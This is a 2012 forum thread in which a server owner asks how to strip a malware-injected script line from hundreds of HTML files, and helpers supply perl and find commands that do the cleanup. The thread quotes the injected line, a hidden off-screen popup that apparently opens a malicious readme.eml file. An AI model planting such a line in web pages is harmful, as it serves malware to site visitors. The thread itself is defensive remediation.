---
title: "i need to remove a line from multiple files"
date: 2012-09-16
forum: General Help
---

### Post by cybercity@localhost on 2012-09-16
A malware has attacked my server and added the line to all html files.

```
 <html><script language="JavaScript">window.open("readme.eml", null,"resizable=no,top=6000,left=6000")</script></html>^@
```
i have deleted all readme.eml files with rm command but i don't want to do it with html files. how can i remove this line from all html files?

---

### Post by Lars Noodén on 2012-09-16
You can do a [global search and replace using perl](http://oreilly.com/pub/h/73).  The function in use is s///

Just be sure to backup your data first so that you can easily restore should something go wrong.

```

perl -pi.orig -e 's/<html><script language="JavaScript">window.open\("readme.eml", null,"resizable=no,top=6000,left=6000"\)<\/script><\/html>//i' *.html

```

Note that () and / have to be escaped.

---

### Post by cybercity@localhost on 2012-09-17
its working fine! but i want to apply this command on all directories and sub directories. because i have more than 250 folders in my root directory. it will take too much time if i cd into each directory and enter this command.

---

### Post by codemaniac on 2012-09-17
> **cybercity@localhost said:**
> its working fine! but i want to apply this command on all directories and sub directories. because i have more than 250 folders in my root directory. it will take too much time if i cd into each directory and enter this command.

You can find all the .html files in your system and execute the perl commandline as adviced by Lars .Something like below may be .

```
find . -name "*.html" | xargs perl -pi.orig -e 's/<html><script language="JavaScript">window.open\("readme.eml", null,"resizable=no,top=6000,left=6000"\)<\/script><\/html>//i'
```

---

### Post by SlugSlug on 2012-09-17
How was the attacker able to edit your files?

---

### Post by cybercity@localhost on 2012-09-17
Thank you Lars and [codemaniac]("http://ubuntuforums.org/member.php?u=997189"). Problem Solved.
> How was the attacker able to edit your files?

i am still shocked that how was the attacker able to inject malicious code into my html files?

---

